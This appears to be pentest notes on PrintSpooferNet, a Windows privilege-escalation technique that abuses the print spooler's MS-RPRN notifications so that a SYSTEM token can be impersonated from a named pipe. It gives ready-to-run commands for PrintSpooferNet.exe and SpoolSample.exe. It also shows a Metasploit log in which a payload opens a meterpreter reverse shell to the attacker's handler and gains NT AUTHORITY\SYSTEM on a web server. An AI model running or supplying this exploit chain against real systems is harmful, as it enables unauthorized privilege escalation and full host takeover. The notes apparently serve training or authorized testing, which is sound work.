# PrintSpooferNet

## How does it work?

Communication to the spooler service is done through Print System Remote Protocol (MS-RPRN). MS-RPRN works through named pipes and the pipe name used by the print spooler service is \pipe\spoolss. Vulnerabilities exist in RpcOpenPrinter and RpcRemoteFindFirstPrinterChangeNotification functions. Specifically, RpcOpenPrinter allows the retrieval of a handle for the printer server, which is used as an argument to the second API - RpcRemoteFindFirstPrinterChangeNotification which monitors printer object changes and sends change notifications to print clients. This change notification requires the print spooler to access the print client. 

We can force the SYSTEM account to connect to a named pipe set up by us. The attack is based on the print spooler service, which runs in a SYSTEM context. The attack is based on the fact that the print spooler monitors printer object changes and sends change notifications to print clients by connecting to their respective named pipes. If we can create a process running with the SeImpersonatePrivilege privilege that simulates a print client (our named pipe server), we will obtain a SYSTEM token that we can impersonate.

## Exploit

In order to exploit, the account executing as needs to have SeImpersonatePrivilege.

Example:

```
# Create a pipe server named test and specify the command to execute
.\PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss "<COMMAND>"
# Use SpoolSample to target the pipe server and its named pipe
.\SpoolSample.exe <TARGET> <TARGET>/pipe/test
```

Example in Metasploit:

```
C:\Windows\Tasks>.\PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss "C:\Windows\Tasks\GiveMeShell.exe"
^Z
Background channel 4? [y/N]  y
meterpreter > shell
Process 1304 created.
Channel 6 created.
Microsoft Windows [Version 10.0.17763.1282]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\Tasks>.\SpoolSample.exe web01 web01/pipe/test
.\SpoolSample.exe web01 web01/pipe/test
[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function

C:\Windows\Tasks>
[!] https://xxx.xxx.xxx.xxx:443 handling request from xxx.xxx.xxx.xxx; (UUID: qqhdhp6e) Without a database connected that payload UUID tracking will not work!
[*] https://xxx.xxx.xxx.xxx:443 handling request from xxx.xxx.xxx.xxx; (UUID: qqhdhp6e) Staging x64 payload (201820 bytes) ...
[!] https://xxx.xxx.xxx.xxx:443 handling request from xxx.xxx.xxx.xxx; (UUID: qqhdhp6e) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 3 opened (xxx.xxx.xxx.xxx:443 -> xxx.xxx.xxx.xxx:49767) at 2023-11-24 12:10:09 +0000

C:\Windows\Tasks>^Z
Background channel 6? [y/N]  y
meterpreter > background
[*] Backgrounding session 2...
msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                     Information                         Connection
  --  ----  ----                     -----------                         ----------
  2         meterpreter x64/windows  IIS APPPOOL\DefaultAppPool @ WEB01  xxx.xxx.xxx.xxx:443 -> xxx.xxx.xxx.xxx:49723 (xxx.xxx.xxx.xxx)
  3         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WEB01         xxx.xxx.xxx.xxx:443 -> xxx.xxx.xxx.xxx:49767 (xxx.xxx.xxx.xxx)
```
